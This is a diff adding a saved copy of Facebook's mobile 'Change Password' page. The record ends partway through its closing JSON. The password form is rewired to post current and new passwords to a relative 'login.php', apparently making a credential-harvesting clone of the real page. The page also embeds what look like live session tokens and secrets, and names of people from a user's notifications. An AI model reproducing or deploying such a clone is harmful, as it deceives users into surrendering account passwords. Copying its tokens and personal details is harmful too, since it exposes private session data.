@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   Change Password
+  </title>
+  <meta content="user-scalable=no,initial-scale=1,maximum-scale=1" name="viewport"/>
+  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed" sizes="196x196"/>
+  <meta content="origin-when-crossorigin" id="meta_referrer" name="referrer"/>
+  <link data-bootloader-hash="WeWRf" href="https://static.xx.fbcdn.net/rsrc.php/v3/yV/l/0,cross/W6ew1RSqSC_.css" rel="stylesheet" type="text/css"/>
+  <link data-bootloader-hash="VzZ6Y" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/l/0,cross/1XgVzGCGCWq.css" rel="stylesheet" type="text/css"/>
+  <link data-bootloader-hash="ZALnP" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/BpXLEFgJAOu.css" rel="stylesheet" type="text/css"/>
+  <link data-bootloader-hash="CvbkU" href="https://static.xx.fbcdn.net/rsrc.php/v3/yZ/l/0,cross/uUq3guesrjT.css" rel="stylesheet" type="text/css"/>
+  <script id="u_0_p">
+   function envFlush(a)\{function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||\{},b(window.Env))}envFlush({"stratcom_event_profiler_hook":"1","timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":true},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"dom_mutation_flag":true});
+  </script>
+  <script>
+   document.domain = 'facebook.com';/^#~?!(?:\/?[\w\.-])+\/?(?:\?|$)/.test(location.hash)&&location.replace(location.hash.substr(location.hash.indexOf("!")+1));
+  </script>
+  <script>
+   __DEV__=0;
+  </script>
+  <script crossorigin="anonymous" data-bootloader-hash="xS4KI" id="u_0_q" src="https://static.xx.fbcdn.net/rsrc.php/v3iuD54/yh/l/en_US/rL33Hb041kd.js">
+  </script>
+  <script id="u_0_r">
+   CavalryLogger=window.CavalryLogger||function(a)\{this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics=\{},this.events=\{},this.ongoing_watch=\{},this.values={t_cstart:window._cstart},this.piggy_values=\{},this.bootloader_metrics=\{},this.resource_to_pagelet_mapping=\{},this.e2eLogged=!1,this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]=="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function()\{},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances=\{},CavalryLogger.id=0,CavalryLogger.perfNubMarkup="",CavalryLogger.disableArtilleryOnUntilOffLogging=!1,CavalryLogger.getInstance=function(a){typeof a=="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.setPerfNubMarkup=function(a){CavalryLogger.perfNubMarkup=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function()\{},CavalryLogger.prototype.profileEarlyResources=function()\{},CavalryLogger.getBootloaderMetricsFromAllLoggers=function()\{},CavalryLogger.start_js=function()\{},CavalryLogger.done_js=function()\{};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==undefined||this.ongoing_watch[c]!==undefined)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a=\{};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");
+  </script>
+  <script id="u_0_s">
+   (function _(a,b,c,d){function e(a){document.cookie=a+"=;expires=Thu, 01-Jan-1970 00:00:01 GMT;path=/;domain=.facebook.com"}function f(a,b){document.cookie=a+"="+b+";path=/;domain=.facebook.com;secure"}if(!a){e(b);e(c);return}a=null;(navigator.userAgent.indexOf("Firefox")!==-1||!window.devicePixelRatio&&navigator.userAgent.indexOf("Windows Phone")!==-1)&&(document.documentElement!=null&&(a=screen.width/document.documentElement.offsetWidth,a=Math.max(1,Math.floor(a*2)/2)));(!a||a===1)&&navigator.userAgent.indexOf("IEMobile")!==-1&&(a=Math.sqrt(screen.deviceXDPI*screen.deviceYDPI)/96,a=Math.max(1,Math.round(a*2)/2));f(b,(a||window.devicePixelRatio||1).toString());e=window.screen?screen.width:0;b=window.screen?screen.height:0;f(c,e+"x"+b);d&&document.cookie&&window.devicePixelRatio>1&&document.location.reload()})(true, "m_pixel_ratio", "wd", false);
+  </script>
+  <meta content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=" data-expires="2017-12-04" data-feature="getInstalledRelatedApps" http-equiv="origin-trial"/>
+  <link crossorigin="use-credentials" href="/data/manifest/" rel="manifest"/>
+ </head>
+ <body class="touch x1 _fzu _50-3 _2v9s" tabindex="0">
+  <script id="u_0_o">
+   (function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);
+  </script>
+  <div id="viewport">
+   <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+    Facebook
+   </h1>
+   <div class="" id="page">
+    <div class="_129_" id="header-notices">
+    </div>
+    <div class="_129-">
+     <div class="_52z5 _451a _3qet _17gp" data-sigil="MTopBlueBarHeader" id="header">
+      <div class="_4g33 _52we" id="mJewelNav">
+       <div class="_4g34">
+        <div class="_59te jewel _hzb noCount" data-sigil="nav-popover feed" data-store='{"tab":"feed"}' id="feed_jewel">
+         <a accesskey="1" class="_19no touchable" data-sigil="icon" href="/home.php" id="u_0_8">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           News Feed
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+        </div>
+       </div>
+       <div class="_4g34">
+        <div class="_59te jewel _hzb noCount" data-sigil="nav-popover requests" data-store='{"tab":"requests"}' id="requests_jewel">
+         <a accesskey="2" class="_19no touchable" data-sigil="icon" data-store='{"behavior":"custom"}' href="/friends/center/requests/" id="u_0_9">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           FRIEND REQUESTS
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+         <div class="flyout popover_hidden" data-sigil="flyout flyout" id="reqs_flyout" role="complementary">
+          <div data-sigil="flyout-content context-layer-root">
+           <header class="_52jh _4g33 _52we _5lm6" data-sigil="header">
+            <div class="_4g34">
+             FRIEND REQUESTS
+            </div>
+            <div class="_5s61">
+             <a aria-label="Find Friends" class="button touchable no-outline" href="/findfriends/browser/?fb_ref=jwl" id="u_0_a" role="button">
+              <i class="img sp_JPcPLf8sjbs sx_b4ad7c">
+              </i>
+             </a>
+            </div>
+           </header>
+           <ol class="_7k7 inner" data-sigil="contents requests-flyout-loading" id="mJewelRequestsFlyoutBody">
+            <li class="acw apl" data-sigil="marea">
+             <div style="text-align:center;">
+              <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root" id="u_0_4">
+              </div>
+             </div>
+            </li>
+           </ol>
+          </div>
+          <div class="_imu">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="_4g34">
+        <div class="_59te jewel _hzb noCount" data-sigil="nav-popover messages" data-store='{"tab":"messages"}' id="messages_jewel">
+         <a accesskey="3" class="_19no touchable" data-sigil="icon" data-store='{"behavior":"custom"}' href="/messages/" id="u_0_b">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           Messages
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+         <div class="flyout popover_hidden" data-sigil="flyout" id="messages_flyout" role="complementary">
+          <div data-sigil="flyout-content context-layer-root">
+           <header class="_52je _52jb _52jh _4g33 _52we _2pi8 _2pi4">
+            <div class="_4g34">
+             <span data-sigil="messages_jewel_header_text">
+              Messages (2)
+             </span>
+            </div>
+            <div class="_5s61">
+             <a aria-label="Compose Message" class="button touchable no-outline" data-sigil="dialog-link" data-store='{"dialogURI":"\/messages\/compose\/dialog\/"}' href="#" id="u_0_c" rel="dialog" role="button">
+              <span class="_5r0s _5r0v img">
+               <i class="_5r0t _4q9b img sp_JPcPLf8sjbs sx_aecbb1">
+               </i>
+               <i class="_5r0u _4q9b img sp_JPcPLf8sjbs sx_be112a">
+               </i>
+              </span>
+             </a>
+            </div>
+           </header>
+           <ol class="_7k7 inner" data-sigil="contents messages-flyout-loading" id="u_0_5">
+            <li class="acw apl" data-sigil="marea">
+             <div style="text-align:center;">
+              <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root" id="u_0_6">
+              </div>
+             </div>
+            </li>
+           </ol>
+          </div>
+          <div class="_imu">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="_4g34">
+        <div class="_59te jewel _hzb _2cnm noCount" data-sigil="nav-popover notifications" data-store='{"tab":"notifications"}' id="notifications_jewel">
+         <a accesskey="4" class="_19no touchable" data-sigil="icon" data-store='{"behavior":"custom"}' href="/notifications.php" id="u_0_d">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           Notifications
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+         <div class="flyout popover_hidden" data-sigil="flyout flyout" id="notifications_flyout" role="complementary">
+          <div data-sigil="flyout-content context-layer-root">
+           <header class="_52je _52jb _52jh _4g33 _52we _2pi8 _2pi4">
+            <div class="_4g34">
+             Notifications
+            </div>
+            <div class="_5s61">
+             <a aria-label="Notification Settings" class="button touchable no-outline" href="/settings/notifications/" id="u_0_e" role="button">
+              <span class="_5r0s _5r0v img">
+               <i class="_5r0t _4q9b img sp_JPcPLf8sjbs sx_49cfb5">
+               </i>
+               <i class="_5r0u _4q9b img sp_JPcPLf8sjbs sx_e81ad6">
+               </i>
+              </span>
+             </a>
+            </div>
+           </header>
+           <div>
+            <ol class="_7k7 inner _1azv" data-sigil="contents">
+             <li class="acw" data-sigil="live-notifications marea" id="u_0_f">
+             </li>
+             <li class="aclb abt" data-sigil="notification marea" id="notif_1527773547839419">
+              <div class="touchable-notification">
+               <a class="touchable" data-sigil="touchable" data-store='{"notif_id":1527773547839419,"target_id":null}' href="https://m.facebook.com/support/view_details/?id=174446763394346&amp;ref_medium=textonly&amp;ref=notif&amp;notif_t=scase_reviewed&amp;second=0&amp;notif_id=1527773547839419">
+                <div class="ib">
+                 <i class="img l" style="background:#d8dce6 url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yw/r/iF3MhG7NKO-.png') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:43px;height:43px;">
+                 </i>
+                 <div class="c">
+                  We reviewed your report of
+                  <span class="_52jh blueName">
+                   Yad Shwan
+                  </span>
+                  .
+                  <br/>
+                  <i class="img sp_8gZJByakRdO sx_1679e2">
+                  </i>
+                  <span class="mfss fcg">
+                   <abbr data-sigil="timestamp" data-store='{"time":1527773547,"short":false,"forceseconds":false}'>
+                    Yesterday at 4:02pm
+                   </abbr>
+                  </span>
+                 </div>
+                </div>
+               </a>
+              </div>
+             </li>
+             <li class="aclb abt" data-sigil="notification marea" id="notif_1527772679653963">
+              <div class="touchable-notification">
+               <a class="touchable" data-sigil="touchable" data-store='{"notif_id":1527772679653963,"target_id":null}' href="https://m.facebook.com/support/view_details/?id=174442916728064&amp;ref_medium=textonly&amp;ref=notif&amp;notif_t=scase_reviewed&amp;second=0&amp;notif_id=1527772679653963">
+                <div class="ib">
+                 <i class="img l" style="background:#d8dce6 url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yw/r/iF3MhG7NKO-.png') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:43px;height:43px;">
+                 </i>
+                 <div class="c">
+                  We reviewed your report of
+                  <span class="_52jh blueName">
+                   Yad Shwan
+                  </span>
+                  .
+                  <br/>
+                  <i class="img sp_8gZJByakRdO sx_1679e2">
+                  </i>
+                  <span class="mfss fcg">
+                   <abbr data-sigil="timestamp" data-store='{"time":1527772679,"short":false,"forceseconds":false}'>
+                    Yesterday at 3:47pm
+                   </abbr>
+                  </span>
+                 </div>
+                </div>
+               </a>
+              </div>
+             </li>
+             <li class="acw abt" data-sigil="notification marea" id="notif_1527762719153405">
+              <div class="touchable-notification">
+               <a class="touchable" data-sigil="touchable" data-store='{"notif_id":1527762719153405,"target_id":null}' href="https://m.facebook.com/support/view_details/?id=174368700068819&amp;ref_medium=textonly&amp;ref=notif&amp;notif_t=scase_reviewed&amp;second=0&amp;notif_id=1527762719153405">
+                <div class="ib">
+                 <i class="img l" style="background:#d8dce6 url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yw/r/iF3MhG7NKO-.png') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:43px;height:43px;">
+                 </i>
+                 <div class="c">
+                  We reviewed your report of
+                  <span class="_52jh blueName">
+                   Hadi Mene
+                  </span>
+                  .
+                  <br/>
+                  <i class="img sp_8gZJByakRdO sx_1679e2">
+                  </i>
+                  <span class="mfss fcg">
+                   <abbr data-sigil="timestamp" data-store='{"time":1527762719,"short":false,"forceseconds":false}'>
+                    Yesterday at 1:01pm
+                   </abbr>
+                  </span>
+                 </div>
+                </div>
+               </a>
+              </div>
+             </li>
+             <li class="aclb abt" data-sigil="notification marea" id="notif_1527720764707016">
+              <div class="touchable-notification">
+               <a class="touchable" data-sigil="touchable" data-store='{"notif_id":1527720764707016,"target_id":null}' href="https://m.facebook.com/support/view_details/?id=174122800093409&amp;ref_medium=textonly&amp;ref=notif&amp;notif_t=scase_reviewed&amp;second=0&amp;notif_id=1527720764707016">
+                <div class="ib">
+                 <i class="img l" style="background:#d8dce6 url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yw/r/iF3MhG7NKO-.png') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:43px;height:43px;">
+                 </i>
+                 <div class="c">
+                  We reviewed your report of
+                  <span class="_52jh blueName">
+                   Louie Hernandez
+                  </span>
+                  .
+                  <br/>
+                  <i class="img sp_8gZJByakRdO sx_1679e2">
+                  </i>
+                  <span class="mfss fcg">
+                   <abbr data-sigil="timestamp" data-store='{"time":1527720764,"short":false,"forceseconds":false}'>
+                    Yesterday at 1:22am
+                   </abbr>
+                  </span>
+                 </div>
+                </div>
+               </a>
+              </div>
+             </li>
+             <li class="aclb abt" data-sigil="notification marea" id="notif_1527720538746269">
+              <div class="touchable-notification">
+               <a class="touchable" data-sigil="touchable" data-store='{"notif_id":1527720538746269,"target_id":null}' href="https://m.facebook.com/support/view_details/?id=174122093426813&amp;ref_medium=textonly&amp;ref=notif&amp;notif_t=scase_reviewed&amp;second=0&amp;notif_id=1527720538746269">
+                <div class="ib">
+                 <i class="img l" style="background:#d8dce6 url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yw/r/iF3MhG7NKO-.png') no-repeat center;background-size:100% 100%;-webkit-background-size:100% 100%;width:43px;height:43px;">
+                 </i>
+                 <div class="c">
+                  We reviewed your report of
+                  <span class="_52jh blueName">
+                   Louie Hernandez
+                  </span>
+                  .
+                  <br/>
+                  <i class="img sp_8gZJByakRdO sx_1679e2">
+                  </i>
+                  <span class="mfss fcg">
+                   <abbr data-sigil="timestamp" data-store='{"time":1527720538,"short":false,"forceseconds":false}'>
+                    Yesterday at 1:18am
+                   </abbr>
+                  </span>
+                 </div>
+                </div>
+               </a>
+              </div>
+             </li>
+             <li class="item more acw abt" data-sigil="marea">
+              <a class="touchable primary" data-sigil="touchable" href="/notifications.php?more">
+               <div class="primarywrap">
+                <div class="content">
+                 <div class="title mfsm fcl">
+                  <strong>
+                   See all notifications
+                  </strong>
+                 </div>
+                </div>
+               </div>
+              </a>
+             </li>
+            </ol>
+           </div>
+          </div>
+          <div class="_imu">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="_4g34">
+        <div class="_59te jewel _hzb noCount" data-sigil="nav-popover search" data-store='{"tab":"search"}' id="search_jewel">
+         <a class="_19no touchable" data-sigil="icon" href="#" id="u_0_g" role="button">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           Search
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+         <div class="flyout popover_hidden" data-sigil="flyout" id="u_0_0" role="complementary">
+          <div data-sigil="flyout-content context-layer-root">
+           <div class="_55wp inner" data-sigil="contents">
+            <div class="_1xh1">
+             <span aria-busy="true" aria-valuemax="100" aria-valuemin="0" aria-valuetext="Loading..." class="img _55ym _55yq _55yo" role="progressbar">
+             </span>
+            </div>
+           </div>
+          </div>
+          <div class="_imu">
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="_4g34">
+        <div class="_59te jewel _hzb noCount _4wrj" data-nocookies="1" data-sigil="nav-popover bookmarks" data-store='{"tab":"bookmarks"}' id="bookmarks_jewel">
+         <a class="_19no touchable" data-sigil="menu-link icon" href="#" id="u_0_h" role="button">
+          <span style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">
+           Main Menu
+          </span>
+          <div class="_2ftp _62ta">
+           <div class="_59tf _2ftq">
+            <span class="_59tg" data-sigil="count">
+             0
+            </span>
+           </div>
+          </div>
+         </a>
+         <div class="flyout popover_hidden" data-sigil="flyout" id="u_0_2" role="complementary">
+          <div data-sigil="flyout-content context-layer-root">
+           <ol class="_7k7 inner" data-sigil="contents" id="u_0_1">
+            <li class="acw apl" data-sigil="marea">
+             <div style="text-align:center;">
+              <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root" id="u_0_3">
+              </div>
+             </div>
+            </li>
+           </ol>
+          </div>
+          <div class="_imu">
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div id="m:chrome:schedulable-graph-search">
+    </div>
+    <div class="_2v9s" data-sigil="context-layer-root content-pane" id="root" role="main">
+     <div class="_55ws">
+      <form action="login.php" data-sigil="m-settings-form" id="m-settings-form" method="post">
+       <input autocomplete="off" name="fb_dtsg" type="hidden" value="AQFSV7NZfTAI:AQGblYoEMJbh"/>
+       <div class="_56be" style="margin-bottom: 12px">
+        <div class="_55wo _55x2 _56bf">
+         <input autocapitalize="off" autocomplete="off" autocorrect="off" class="_56bg _55ws" name="old_password" placeholder="Current password" type="password"/>
+         <input autocapitalize="off" autocomplete="off" autocorrect="off" class="_56bg _55ws" name="new_password" placeholder="New password" type="password"/>
+         <input autocapitalize="off" autocomplete="off" autocorrect="off" class="_56bg _55ws" name="new_password" placeholder="Re-type new password" type="password"/>
+        </div>
+       </div>
+       <div>
+        <button class="_54k8 _52jg _56bs _26vk _56b_ _56bw _56bu" data-sigil="touchable" name="save" type="submit" value="Save Changes">
+         <span class="_55sr">
+          Save Changes
+         </span>
+        </button>
+        <a class="_54k8 _56bs _26vk _56b_ _56bw _56bt _52jg" data-sigil="touchable" href="/settings/security/" role="button" style="margin-top: 12px">
+         <span class="_55sr">
+          Cancel
+         </span>
+        </a>
+       </div>
+      </form>
+      <div class="_52jc _52jj _55ws">
+       <a href="/recover/initiate/?c=https%3A%2F%2Ftouch.facebook.com%2Fsettings%2Fsecurity%2Fpassword%2F" id="forgot-password-link">
+        Forgot Password?
+       </a>
+      </div>
+     </div>
+     <div>
+     </div>
+    </div>
+    <div class="viewportArea _2v9s" data-sigil="marea" id="u_0_i" style="display:none">
+     <div class="_5vsg" id="u_0_j">
+     </div>
+     <div class="_5vsh" id="u_0_k">
+     </div>
+     <div class="_5v5d fcg">
+      <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root">
+      </div>
+      Loading...
+     </div>
+    </div>
+    <div class="viewportArea aclb" data-sigil="marea" id="mErrorView" style="display:none">
+     <div class="container">
+      <div class="image">
+      </div>
+      <div class="message" data-sigil="error-message">
+      </div>
+      <a class="link" data-sigil="MPageError:retry">
+       Try Again
+      </a>
+     </div>
+    </div>
+   </div>
+  </div>
+  <div id="static_templates">
+   <div class="mDialog" id="modalDialog" style="display:none">
+    <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+     <div class="_4g33 _52we">
+      <div class="_5s61">
+       <div class="_52z7">
+        <button class="cancelButton btn btnD bgb mfss touchable" data-sigil="dialog-cancel-button" id="u_0_m" type="submit" value="Cancel">
+         Cancel
+        </button>
+        <button aria-label="Back" class="backButton btn btnI bgb mfss touchable iconOnly" data-sigil="dialog-back-button" id="u_0_n" type="submit" value="Back">
+         <i class="img sp_Tz_1R9eshBx sx_109a94" style="margin-top: 2px;">
+         </i>
+        </button>
+       </div>
+      </div>
+      <div class="_4g34">
+       <div class="_52z6">
+        <div class="_50l4 mfsl fcw" data-sigil="m-dialog-header-title dialog-title" id="m-future-page-header-title">
+         Loading...
+        </div>
+       </div>
+      </div>
+      <div class="_5s61">
+       <div class="_52z8" id="modalDialogHeaderButtons">
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="modalDialogView" id="modalDialogView">
+    </div>
+    <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+     <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root" id="u_0_l">
+     </div>
+     Loading...
+    </div>
+   </div>
+  </div>
+  <script type="text/javascript">
+   /*<![CDATA[*/(function(){function si_cj(m){setTimeout(function(){new Image().src="https:\/\/error.facebook.com\/common\/scribe_endpoint.php?c=si_clickjacking&t=6330"+"&m="+m;},5000);}if(top!=self && !false){try{if(parent!=top){throw 1;}var si_cj_d=["apps.facebook.com","apps.beta.facebook.com"];var href=top.location.href.toLowerCase();for(var i=0;i<si_cj_d.length;i++){if (href.indexOf(si_cj_d[i])>=0){throw 1;}}si_cj("3 https:\/\/touch.facebook.com\/login\/save-device\/?login_source=login");}catch(e){si_cj("1 \thttps:\/\/touch.facebook.com\/login\/save-device\/?login_source=login");window.document.write("\u003Cstyle>body * {display:none !important;}\u003C\/style>\u003Ca href=\"#\" onclick=\"top.location.href=window.location.href\" style=\"display:block !important;padding:10px\">Go to Facebook.com\u003C\/a>");/*9G7L1Tnn*/}}}())/*]]>*/
+  </script>
+  <script crossorigin="anonymous" data-bootloader-hash="++0ur" id="u_0_t" src="https://static.xx.fbcdn.net/rsrc.php/v3iP6F4/yK/l/en_US/R8tpWLUTl9B.js">
+  </script>
+  <script crossorigin="anonymous" data-bootloader-hash="mmyXd" id="u_0_u" src="https://static.xx.fbcdn.net/rsrc.php/v3i9bE4/yJ/l/en_US/2iXQuRxXYVV.js">
+  </script>
+  <script id="u_0_v">
+   require("TimeSlice").guard(function() {(require("ServerJSDefine")).handleDefines([["MWebStorageMonsterWhiteList",[],{"whitelist":["^Banzai$","^bz","^mutex","^msys","^sp_pi$","^\\:userchooser\\:osessusers$","^\\:userchooser\\:settings$","^[0-9]+:powereditor:","^Bandicoot\\:","^brands\\:console\\:config$","^CacheStorageVersion$","^consoleEnabled$","^_video_$","^vc_","^_showMDevConsole$","^_ctv_$","^ga_client_id$","^qe_switcher_nub_selection$","^_mswam_$"]},254],["ServerNonce",[],{"ServerNonce":"CagbtVf4Hbl_B727qzc14J"},141],["UserAgentData",[],{"browserArchitecture":"32","browserFullVersion":"62.0.3202.89","browserMinorVersion":0,"browserName":"Chrome","browserVersion":62,"deviceName":"Unknown","engineName":"WebKit","engineVersion":"537.36","platformArchitecture":"32","platformName":"Linux","platformVersion":null,"platformFullVersion":null},527],["MTouchableSyntheticClickGK",[],{"USE_SYNTHETIC_CLICK":true},368],["ErrorDebugHooks",[],{"SnapShotHook":null},185],["KSConfig",[],{"killed":{"__set":["POCKET_MONSTERS_CREATE","POCKET_MONSTERS_DELETE","VIDEO_DIMENSIONS_FROM_PLAYER_IN_UPLOAD_DIALOG","PREVENT_INFINITE_URL_REDIRECT","POCKET_MONSTERS_UPDATE_NAME"]}},2580],["MJSEnvironment",[],{"IS_APPLE_WEBKIT_IOS":false,"IS_TABLET":false,"IS_ANDROID":false,"IS_CHROME":true,"IS_FIREFOX":false,"IS_WINDOWS_PHONE":false,"IS_SAMSUNG_DEVICE":false,"OS_VERSION":0,"PIXEL_RATIO":1,"BROWSER_NAME":"Chrome Desktop"},46],["MLoadingIndicatorSigils",[],{"ANIMATE":"m-loading-indicator-animate","ROOT":"m-loading-indicator-root"},279],["MRequestConfig",[],{"dtsg":{"token":"AQFSV7NZfTAI:AQGblYoEMJbh","valid_for":86400,"expire":1527962712},"checkResponseOrigin":true,"checkResponseToken":true,"ajaxResponseToken":{"secret":"HQEbK1BJmtQ2ac9uG5mdM_hRunxW37G_","encrypted":"AYkS3fOUqZGer4hLzr1NMELS2MbYPl205bKnu3AEGqr64j0LXW_jbtfnK57bzI8pUY9FNH96Ign7cUHLp9x-4SxpOi_Q1Jesqb8edpMUxO4yEA"}},51],["PromiseUsePolyfillSetImmediateGK",[],{"www_always_use_polyfill_setimmediate":false},2190],["ZeroRewriteRules",[],{"rewrite_rules":\{},"whitelist":{"\/hr\/r":1,"\/hr\/p":1,"\/zero\/unsupported_browser\/":1,"\/zero\/policy\/optin":1,"\/zero\/optin\/write\/":1,"\/zero\/optin\/legal\/":1,"\/zero\/optin\/free\/":1,"\/about\/privacy\/":1,"\/about\/privacy\/update\/":1,"\/about\/privacy\/update":1,"\/zero\/toggle\/welcome\/":1,"\/work\/landing":1,"\/work\/login\/":1,"\/work\/email\/":1,"\/ai.php":1,"\/js_dialog_resources\/dialog_descriptions_android.json":0,"\/connect\/jsdialog\/MPlatformAppInvitesJSDialog\/":0,"\/connect\/jsdialog\/MPlatformOAuthShimJSDialog\/":0,"\/connect\/jsdialog\/MPlatformLikeJSDialog\/":0,"\/qp\/interstitial\/":1,"\/qp\/action\/redirect\/":1,"\/qp\/action\/close\/":1,"\/zero\/support\/ineligible\/":1,"\/zero_balance_redirect\/":1,"\/zero_balance_redirect":1,"\/l.php":1,"